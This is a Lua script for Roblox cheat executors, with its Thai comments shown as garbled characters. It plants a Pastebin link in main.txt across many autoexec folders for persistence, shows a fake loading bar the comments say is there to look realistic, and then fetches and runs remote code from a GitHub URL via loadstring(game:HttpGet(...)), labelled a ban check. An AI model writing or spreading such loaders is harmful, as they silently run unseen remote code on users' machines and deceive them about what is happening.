-- create_main_txt.lua
-- ‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏£‡∏±‡∏ô‡∏ö‡∏ô executor (Synapse/Krnl/Script-Ware/Fluxus ‡∏Ø‡∏•.)
-- ‡∏°‡∏±‡∏ô‡∏à‡∏∞‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏™‡∏£‡πâ‡∏≤‡∏á main.txt ‡πÉ‡∏ô‡∏´‡∏•‡∏≤‡∏¢‡πÜ path ‡∏ó‡∏µ‡πà‡∏°‡∏±‡∏Å‡πÉ‡∏ä‡πâ‡πÄ‡∏õ‡πá‡∏ô autoexec

local content = [[https://pastebin.com/raw/Cpt6y553]]

-- ‡∏£‡∏≠‡∏á‡∏£‡∏±‡∏ö‡∏ä‡∏∑‡πà‡∏≠‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏´‡∏•‡∏≤‡∏¢‡πÅ‡∏ö‡∏ö
local writefile_fn = writefile or write_file or (syn and syn.write_file) or (write and write) -- last fallback
local isfolder_fn  = isfolder or is_folder or (syn and syn.is_folder) or (syn and syn.isfolder)
local makefolder_fn = makefolder or make_folder or (syn and syn.make_folder) or (syn and syn.makefolder)
local isfile_fn = isfile or is_file

local tried = {}
local results = {}

-- ‡∏•‡∏¥‡∏™‡∏ï‡πå‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡∏ó‡∏µ‡πà‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏™‡∏£‡πâ‡∏≤‡∏á (‡∏£‡∏ß‡∏° root + autoexec variants)
local paths = {
    "main.txt",
    "autoexec/main.txt",
    "Autoexec/main.txt",
    "AutoExecute/main.txt",
    "AutoExec/main.txt",
    "synapse/autoexec/main.txt",
    "scripts/autoexec/main.txt",
    "executor_autoexec/main.txt"
}

local function safe_mkdir(dir)
    if not makefolder_fn then return false, "no makefolder available" end
    local ok, err = pcall(function() makefolder_fn(dir) end)
    if ok then return true end
    -- ‡∏ñ‡πâ‡∏≤‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡∏°‡∏µ‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß ‡∏ö‡∏≤‡∏á executor ‡∏à‡∏∞ error -> ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö isfolder
    if isfolder_fn and isfolder_fn(dir) then
        return true
    end
    return false, err
end

local function safe_write(path, data)
    if not writefile_fn then return false, "no writefile available in this executor" end
    local ok, err = pcall(function() writefile_fn(path, data) end)
    if ok then return true end
    return false, err
end

for _, p in ipairs(paths) do
    local dir = p:match("^(.*)/") -- get dir portion or nil
    if dir then
        -- ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡∏Å‡πà‡∏≠‡∏ô (‡∏ñ‡πâ‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ)
        local made, reason = safe_mkdir(dir)
        if not made then
            -- ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏™‡∏£‡πâ‡∏≤‡∏á ‡πÇ‡∏≠‡∏Å‡∏≤‡∏™‡∏¢‡∏±‡∏á‡∏°‡∏µ‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡πà root ‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡∏Å‡∏±‡∏ô
            results[p] = { ok = false, err = "mkfolder failed: "..tostring(reason) }
        end
    end

    local ok, err = safe_write(p, content)
    if ok then
        results[p] = { ok = true }
    else
        results[p] = { ok = false, err = tostring(err) }
    end
end

-- ‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡∏ú‡∏•‡∏™‡∏£‡∏∏‡∏õ
print("=== main.txt creation report ===")
local anySuccess = false
for path, r in pairs(results) do
    if r.ok then
        print("[OK]  " .. path)
        anySuccess = true
    else
        print("[ERR] " .. path .. "  -> " .. (r.err or "unknown"))
    end
end

if anySuccess then
    print("main.txt ‡∏ñ‡∏π‡∏Å‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÉ‡∏ô‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡∏Ç‡πâ‡∏≤‡∏á‡∏ï‡πâ‡∏ô (‡∏î‡∏π [OK])")
else
    print("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÑ‡∏ü‡∏•‡πå‡πÑ‡∏î‡πâ: executor ‡∏ô‡∏µ‡πâ‡∏î‡∏π‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡πÑ‡∏°‡πà‡∏°‡∏µ API ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏ü‡∏•‡πå (writefile) ‡∏´‡∏£‡∏∑‡∏≠‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏à‡∏≥‡∏Å‡∏±‡∏î")
    print("‡∏ñ‡πâ‡∏≤‡∏Ñ‡∏∏‡∏ì‡πÉ‡∏ä‡πâ executor ‡∏ö‡∏ô‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠/‡∏´‡∏£‡∏∑‡∏≠ sandboxed client ‡∏≠‡∏≤‡∏à‡∏ï‡πâ‡∏≠‡∏á‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÑ‡∏ü‡∏•‡πå‡∏î‡πâ‡∏ß‡∏¢‡∏ï‡∏±‡∏ß‡πÄ‡∏≠‡∏á‡∏à‡∏≤‡∏Å‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏Ñ‡∏≠‡∏°‡∏û‡∏¥‡∏ß‡πÄ‡∏ï‡∏≠‡∏£‡πå")
end

-- ‡πÅ‡∏™‡∏î‡∏á‡∏Ñ‡∏≥‡πÅ‡∏ô‡∏∞‡∏ô‡∏≥‡∏ó‡πâ‡∏≤‡∏¢
print("‡∏´‡∏≤‡∏Å‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÄ‡∏ô‡∏∑‡πâ‡∏≠‡∏´‡∏≤ ‡πÉ‡∏´‡πâ‡πÅ‡∏Å‡πâ‡∏ï‡∏±‡∏ß‡πÅ‡∏õ‡∏£ 'content' ‡πÉ‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏ô‡∏µ‡πâ‡∏Å‡πà‡∏≠‡∏ô‡∏£‡∏±‡∏ô‡∏≠‡∏µ‡∏Å‡∏Ñ‡∏£‡∏±‡πâ‡∏á")
-- ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏£‡∏∞‡∏ö‡∏ß‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡πá‡∏Ñ
print("Checking Banlist üîÉ")

-- ‡∏£‡∏∞‡∏ö‡∏ö‡πÇ‡∏´‡∏•‡∏î 1-100%
for i = 1, 100, math.random(5, 15) do
    task.wait(0.05) -- ‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤‡πÉ‡∏´‡πâ‡∏î‡∏π‡∏™‡∏°‡∏à‡∏£‡∏¥‡∏á
    print("Loading... " .. i .. "%")
end
-------------------------
print("Loading... 100% ‚úÖ")

-- ‡πÇ‡∏´‡∏•‡∏î‡πÅ‡∏•‡∏∞‡∏£‡∏±‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡πÅ‡∏ö‡∏ô
local isBanned = loadstring(game:HttpGet('https://raw.githubusercontent.com/wkdopajwiojf/Zombie-game/main/Ban%20land'))()

-- ‡πÄ‡∏ä‡πá‡∏Ñ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
if isBanned then
    print("Ban ‚ùå") -- ‡πÅ‡∏™‡∏î‡∏á‡∏ß‡πà‡∏≤‡∏ñ‡∏π‡∏Å‡πÅ‡∏ö‡∏ô
    return -- **‡∏´‡∏¢‡∏∏‡∏î‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏ó‡∏µ‡πà‡∏ô‡∏µ‡πà**
end

print("Success ‚úÖ") -- ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡πÅ‡∏ö‡∏ô

